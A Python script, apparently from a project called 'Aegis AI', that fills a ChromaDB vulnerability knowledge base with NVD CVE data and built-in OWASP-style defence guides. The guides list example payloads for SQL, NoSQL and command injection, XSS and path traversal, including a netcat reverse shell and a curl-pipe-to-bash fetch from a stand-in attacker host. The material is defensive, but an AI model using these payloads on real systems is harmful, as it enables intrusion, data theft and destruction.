"""
expand_knowledge_base.py - 扩展 CVE 知识库

按漏洞类型爬取更多相关 CVE 数据：
- SQL 注入 (CWE-89)
- NoSQL 注入 (CWE-943)
- 命令注入/RCE (CWE-78, CWE-94)
- XSS (CWE-79)
- 路径穿越 (CWE-22)
- 反序列化 (CWE-502)
- 硬编码凭证 (CWE-798)

数据来源：
1. NVD API（官方 CVE 数据库）
2. 内置的高价值安全知识（OWASP、最佳实践）
"""

import os
import time

# 环境变量处理
try:
    from dotenv import load_dotenv

    load_dotenv()
except ImportError:
    pass

import certifi
import chromadb
import httpx

# 漏洞类型与 CWE 映射
VULN_TYPE_CWE_MAP = {
    "SQL_INJECTION": {
        "cwe_ids": ["CWE-89", "CWE-564"],
        "keywords": ["sql injection", "sqli", "database injection"],
        "description": "SQL 注入漏洞",
    },
    "NOSQL_INJECTION": {
        "cwe_ids": ["CWE-943", "CWE-1286"],
        "keywords": ["nosql injection", "mongodb injection", "document injection"],
        "description": "NoSQL 注入漏洞",
    },
    "RCE_COMMAND_EXEC": {
        "cwe_ids": ["CWE-78", "CWE-94", "CWE-77"],
        "keywords": ["command injection", "code execution", "rce", "remote code execution"],
        "description": "远程代码执行/命令注入漏洞",
    },
    "XSS": {
        "cwe_ids": ["CWE-79"],
        "keywords": ["cross-site scripting", "xss", "script injection"],
        "description": "跨站脚本漏洞",
    },
    "PATH_TRAVERSAL": {
        "cwe_ids": ["CWE-22", "CWE-23", "CWE-36"],
        "keywords": ["path traversal", "directory traversal", "file inclusion"],
        "description": "路径穿越漏洞",
    },
    "DESERIALIZATION": {
        "cwe_ids": ["CWE-502", "CWE-915"],
        "keywords": ["deserialization", "insecure deserialization", "object injection"],
        "description": "不安全反序列化漏洞",
    },
    "HARDCODED_CREDENTIALS": {
        "cwe_ids": ["CWE-798", "CWE-259", "CWE-321"],
        "keywords": ["hardcoded password", "hardcoded credentials", "embedded credentials"],
        "description": "硬编码凭证漏洞",
    },
}


# 内置的高价值安全知识（不依赖 NVD API）
BUILTIN_SECURITY_KNOWLEDGE = [
    # SQL 注入
    {
        "id": "OWASP-SQLI-001",
        "document": """【SQL 注入防护指南】
漏洞类型: SQL 注入 (CWE-89)
风险等级: Critical

攻击原理:
攻击者通过在用户输入中插入恶意 SQL 代码，操纵数据库查询。

常见攻击载荷:
- ' OR '1'='1
- '; DROP TABLE users; --
- UNION SELECT * FROM passwords

防护措施:
1. 使用参数化查询（Prepared Statements）
2. 使用 ORM 框架
3. 输入验证和白名单过滤
4. 最小权限原则

示例代码（Python）:
# 不安全
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# 安全
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
""",
        "metadata": {"type": "SQL_INJECTION", "source": "OWASP", "severity": "Critical"},
    },
    # NoSQL 注入
    {
        "id": "OWASP-NOSQLI-001",
        "document": """【NoSQL 注入防护指南】
漏洞类型: NoSQL 注入 (CWE-943)
风险等级: High

攻击原理:
攻击者通过在查询中注入恶意操作符（$where, $ne, $gt 等），绕过认证或提取数据。

常见攻击载荷:
- {"$ne": ""} - 绕过空密码检查
- {"$gt": ""} - 匹配所有非空值
- {"$where": "this.password.length > 0"} - 执行 JavaScript

防护措施:
1. 避免直接使用用户输入构造查询
2. 对输入进行类型检查
3. 禁用或限制 $where 操作符
4. 使用 ODM 框架的安全方法

示例代码（Node.js）:
# 不安全
db.users.findOne({ user: req.body.user, pass: req.body.pass })

# 安全
const user = String(req.body.user);
const pass = String(req.body.pass);
db.users.findOne({ user: user, pass: pass })
""",
        "metadata": {"type": "NOSQL_INJECTION", "source": "OWASP", "severity": "High"},
    },
    # RCE/命令注入
    {
        "id": "OWASP-RCE-001",
        "document": """【远程代码执行防护指南】
漏洞类型: 命令注入/RCE (CWE-78)
风险等级: Critical

攻击原理:
攻击者通过注入恶意命令，在服务器上执行任意代码。

危险函数:
- Python: eval(), exec(), os.system(), subprocess.call()
- JavaScript: eval(), Function(), child_process.exec()
- PHP: system(), exec(), shell_exec(), passthru()

常见攻击载荷:
- ; cat /etc/passwd
- | nc attacker.com 1234 -e /bin/sh
- $(curl http://attacker.com/shell.sh | bash)

防护措施:
1. 避免使用 eval() 和类似函数
2. 使用白名单验证输入
3. 使用沙箱环境
4. 最小权限原则

示例代码:
# 不安全
os.system(f"ping {user_input}")

# 安全
import shlex
subprocess.run(["ping", "-c", "1", shlex.quote(user_input)])
""",
        "metadata": {"type": "RCE_COMMAND_EXEC", "source": "OWASP", "severity": "Critical"},
    },
    # XSS
    {
        "id": "OWASP-XSS-001",
        "document": """【跨站脚本攻击防护指南】
漏洞类型: XSS (CWE-79)
风险等级: High

攻击类型:
1. 反射型 XSS - 恶意脚本来自请求
2. 存储型 XSS - 恶意脚本存储在服务器
3. DOM 型 XSS - 恶意脚本在客户端执行

常见攻击载荷:
- <script>alert('XSS')</script>
- <img src=x onerror=alert('XSS')>
- javascript:alert('XSS')

防护措施:
1. 输出编码（HTML/JS/URL/CSS 编码）
2. 使用 Content-Security-Policy
3. 使用框架自带的 XSS 防护
4. 避免使用 innerHTML

示例代码:
# 不安全
element.innerHTML = userInput;

# 安全
element.textContent = userInput;
// 或使用 DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);
""",
        "metadata": {"type": "XSS", "source": "OWASP", "severity": "High"},
    },
    # 路径穿越
    {
        "id": "OWASP-PT-001",
        "document": """【路径穿越防护指南】
漏洞类型: 路径穿越 (CWE-22)
风险等级: High

攻击原理:
攻击者通过 ../ 等序列访问服务器上的任意文件。

常见攻击载荷:
- ../../../etc/passwd
- ..\\..\\..\\windows\\system32\\config\\sam
- ....//....//....//etc/passwd (过滤绕过)

防护措施:
1. 验证并规范化文件路径
2. 使用白名单限制可访问目录
3. 检查路径是否在允许的目录内
4. 使用 chroot 或容器隔离

示例代码:
# 不安全
file_path = f"/uploads/{filename}"

# 安全
import os
base_dir = "/uploads"
file_path = os.path.normpath(os.path.join(base_dir, filename))
if not file_path.startswith(base_dir):
    raise ValueError("Invalid path")
""",
        "metadata": {"type": "PATH_TRAVERSAL", "source": "OWASP", "severity": "High"},
    },
    # 反序列化
    {
        "id": "OWASP-DESER-001",
        "document": """【不安全反序列化防护指南】
漏洞类型: 反序列化 (CWE-502)
风险等级: Critical

攻击原理:
攻击者通过构造恶意的序列化数据，在反序列化时执行任意代码。

危险场景:
- Python: pickle.loads() 处理不受信任的数据
- Java: ObjectInputStream.readObject()
- PHP: unserialize()
- Node.js: node-serialize

防护措施:
1. 避免反序列化不受信任的数据
2. 使用安全的序列化格式（JSON）
3. 实现严格的类型检查
4. 使用签名验证数据完整性

示例代码:
# 不安全
import pickle
data = pickle.loads(user_input)

# 安全
import json
data = json.loads(user_input)
# 或使用 HMAC 签名验证
""",
        "metadata": {"type": "DESERIALIZATION", "source": "OWASP", "severity": "Critical"},
    },
    # 硬编码凭证
    {
        "id": "OWASP-HC-001",
        "document": """【硬编码凭证防护指南】
漏洞类型: 硬编码凭证 (CWE-798)
风险等级: High

风险:
源代码中的硬编码密码可能被泄露，导致系统被入侵。

常见问题:
- 代码中直接写入数据库密码
- API 密钥硬编码在源码中
- 测试凭证遗留在生产代码中

防护措施:
1. 使用环境变量存储敏感信息
2. 使用配置管理工具（Vault、AWS Secrets Manager）
3. 使用 .gitignore 排除配置文件
4. 定期轮换密钥

示例代码:
# 不安全
password = "admin123"
db.connect(password=password)

# 安全
import os
password = os.environ.get("DB_PASSWORD")
db.connect(password=password)
""",
        "metadata": {"type": "HARDCODED_CREDENTIALS", "source": "OWASP", "severity": "High"},
    },
    # 更多通用安全知识
    {
        "id": "SEC-INPUT-001",
        "document": """【输入验证最佳实践】
原则: 所有用户输入都是不可信的

验证策略:
1. 白名单验证 - 只接受已知安全的输入
2. 类型检查 - 确保输入类型正确
3. 长度限制 - 防止缓冲区溢出
4. 格式验证 - 使用正则表达式验证格式

编码输出:
- HTML 上下文: HTML 实体编码
- JavaScript 上下文: JavaScript 编码
- URL 上下文: URL 编码
- CSS 上下文: CSS 编码
""",
        "metadata": {"type": "GENERAL", "source": "OWASP", "severity": "Info"},
    },
    {
        "id": "SEC-AUTH-001",
        "document": """【认证安全最佳实践】
密码存储:
- 使用强哈希算法（bcrypt, Argon2, scrypt）
- 添加盐值（salt）
- 避免使用 MD5、SHA1

会话管理:
- 使用安全的会话 ID
- 设置合理的会话超时
- 登录后重新生成会话 ID
- 使用 HTTPS 传输会话

多因素认证:
- 结合密码 + OTP/硬件令牌
- 使用 TOTP（时间一次性密码）
""",
        "metadata": {"type": "GENERAL", "source": "OWASP", "severity": "Info"},
    },
]


class KnowledgeBaseExpander:
    """知识库扩展器"""

    def __init__(self, db_path: str = "./data/aegis_db", collection_name: str = "cve_core"):
        self.db_path = db_path
        self.collection_name = collection_name

        # 初始化 ChromaDB
        self.client = chromadb.PersistentClient(path=db_path)
        self.collection = self.client.get_or_create_collection(name=collection_name)

        print(f"✅ 连接到知识库: {db_path}")
        print(f"📊 当前记录数: {self.collection.count()}")

    def add_builtin_knowledge(self) -> int:
        """添加内置安全知识"""
        added = 0

        for item in BUILTIN_SECURITY_KNOWLEDGE:
            # 检查是否已存在
            existing = self.collection.get(ids=[item["id"]])
            if existing["ids"]:
                print(f"⏭️ 跳过已存在: {item['id']}")
                continue

            # 添加到知识库
            self.collection.add(ids=[item["id"]], documents=[item["document"]], metadatas=[item["metadata"]])
            added += 1
            print(f"✅ 添加: {item['id']}")

        return added

    def fetch_cves_by_cwe(self, cwe_id: str, max_results: int = 50) -> list[dict]:
        """
        通过 CWE ID 从 NVD 获取相关 CVE

        需要 NVD API Key: https://nvd.nist.gov/developers/request-an-api-key
        """
        api_key = os.getenv("NVD_API_KEY")
        if not api_key:
            print(f"⚠️ 未设置 NVD_API_KEY，跳过 {cwe_id} 的 CVE 获取")
            return []

        url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        headers = {"apiKey": api_key}
        params = {"cweId": cwe_id, "resultsPerPage": min(max_results, 100)}

        try:
            response = httpx.get(url, headers=headers, params=params, timeout=30.0, verify=certifi.where())
            response.raise_for_status()

            data = response.json()
            vulnerabilities = data.get("vulnerabilities", [])

            cves = []
            for vuln in vulnerabilities:
                cve = vuln.get("cve", {})
                cve_id = cve.get("id", "")
                descriptions = cve.get("descriptions", [])

                # 获取英文描述
                desc = ""
                for d in descriptions:
                    if d.get("lang") == "en":
                        desc = d.get("value", "")
                        break

                if cve_id and desc:
                    cves.append({"id": cve_id, "description": desc, "cwe": cwe_id})

            return cves

        except (ConnectionError, TimeoutError, httpx.HTTPError) as e:
            print(f"❌ 获取 {cwe_id} 的 CVE 失败: {e}")
            return []

    def expand_by_vuln_type(self, vuln_type: str, max_cves: int = 30) -> int:
        """按漏洞类型扩展知识库"""
        config = VULN_TYPE_CWE_MAP.get(vuln_type)
        if not config:
            print(f"❌ 未知漏洞类型: {vuln_type}")
            return 0

        added = 0
        print(f"\n📂 扩展 {vuln_type} ({config['description']})...")

        for cwe_id in config["cwe_ids"]:
            print(f"  🔍 获取 {cwe_id} 相关 CVE...")
            cves = self.fetch_cves_by_cwe(cwe_id, max_results=max_cves)

            for cve in cves:
                # 检查是否已存在
                existing = self.collection.get(ids=[cve["id"]])
                if existing["ids"]:
                    continue

                # 构建文档
                document = f"""漏洞编号: {cve["id"]}
类型: {config["description"]}
CWE: {cve["cwe"]}
描述: {cve["description"]}
"""

                # 添加到知识库
                self.collection.add(
                    ids=[cve["id"]],
                    documents=[document],
                    metadatas={"type": vuln_type, "cwe": cve["cwe"], "source": "NVD"},
                )
                added += 1
                print(f"    ✅ 添加: {cve['id']}")

            # API 限流
            time.sleep(1)

        return added

    def expand_all(self, max_cves_per_type: int = 30) -> dict[str, int]:
        """扩展所有漏洞类型"""
        results = {}

        # 1. 添加内置知识
        print("\n📚 添加内置安全知识...")
        results["builtin"] = self.add_builtin_knowledge()

        # 2. 按漏洞类型获取 CVE
        api_key = os.getenv("NVD_API_KEY")
        if api_key:
            for vuln_type in VULN_TYPE_CWE_MAP.keys():
                results[vuln_type] = self.expand_by_vuln_type(vuln_type, max_cves_per_type)
        else:
            print("\n⚠️ 未设置 NVD_API_KEY，跳过 NVD CVE 获取")
            print("   获取 API Key: https://nvd.nist.gov/developers/request-an-api-key")

        return results

    def get_stats(self) -> dict[str, int]:
        """获取知识库统计"""
        total = self.collection.count()

        # 按类型统计
        by_type = {}
        results = self.collection.get(include=["metadatas"])

        for metadata in results.get("metadatas", []):
            if metadata:
                vuln_type = metadata.get("type", "UNKNOWN")
                by_type[vuln_type] = by_type.get(vuln_type, 0) + 1

        return {"total": total, "by_type": by_type}


def main():
    """主函数"""
    print("=" * 60)
    print("🚀 Aegis AI 知识库扩展工具")
    print("=" * 60)

    # 初始化
    expander = KnowledgeBaseExpander()

    # 扩展知识库
    results = expander.expand_all(max_cves_per_type=30)

    # 显示结果
    print("\n" + "=" * 60)
    print("📊 扩展结果:")
    print("=" * 60)

    total_added = 0
    for category, count in results.items():
        print(f"  {category}: +{count} 条")
        total_added += count

    print(f"\n  总计新增: {total_added} 条")

    # 显示统计
    stats = expander.get_stats()
    print("\n📈 知识库统计:")
    print(f"  总记录数: {stats['total']}")
    print("  按类型分布:")
    for vuln_type, count in sorted(stats["by_type"].items(), key=lambda x: -x[1]):
        print(f"    {vuln_type}: {count}")


if __name__ == "__main__":
    main()
